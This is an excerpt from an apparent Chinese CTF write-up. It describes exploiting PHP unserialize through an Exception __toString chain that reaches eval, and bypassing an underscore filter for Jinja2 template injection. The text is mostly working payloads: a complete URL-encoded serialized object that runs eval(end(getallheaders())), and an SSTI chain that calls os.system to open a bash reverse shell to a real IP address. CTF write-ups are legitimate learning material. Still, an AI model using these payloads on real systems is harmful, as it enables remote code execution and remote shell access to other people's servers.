...
class message
{
    ...
    {
        if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $this->page))  {
            eval($this->page);
        } else {
            die("go away cxk!");
        }
...
echo unserialize($res);
```



无任何过滤的反序列化,message的 __destruct
...
`echo unserialize($res);`这里必须要有__tostring魔术方法,或者不是对象

因为第一个字符不能为a,所以必须找一个包含__tostring的类

这里我盯上了exception,将其中一个属性换为message对象,测试成功,nice

接着就是绕过正则,这个正则只允许xxxx(xxx());的命令



翻一翻手册中关于数组的部分+用http头传参数(getallheaders)

最终payload:

```php
mood=O%3A9%3A%22Exception%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00message%22%3BO%3A7%3A%22message%22%3A4%3A%7Bs%3A14%3A%22%00message%00files%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22%00message%00sql%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22%00message%00res%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00message%00page%22%3Bs%3A27%3A%22eval%28end%28getallheaders%28%29%29%29%3B%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A1%3B%7D
```
...
过滤了`__`,用`{{''|attr('_'+'_class_'+'_')|attr('_'+'_'+'m'+'r'+'o'+'_'+'_')}}`来绕过
...
```
{{''|attr('_'+'_class_'+'_')|attr('_'+'_'+'b'+'a'+'s'+'e'+'_'+'_')|attr('_'+'_'+'s'+'ubclasses'+'_'+'_')()|attr('_'+'_getitem_'+'_')(249)|attr('_'+'_i'+'nit_'+'_')|attr('_'+'_g'+'lobals_'+'_')|attr('_'+'_getitem_'+'_')('o'+'s')|attr('s'+'ystem')|attr('_'+'_cal'+'l_'+'_')('bash -i >& /dev/tcp/39.108.164.219/60005 0>&1')}}
```
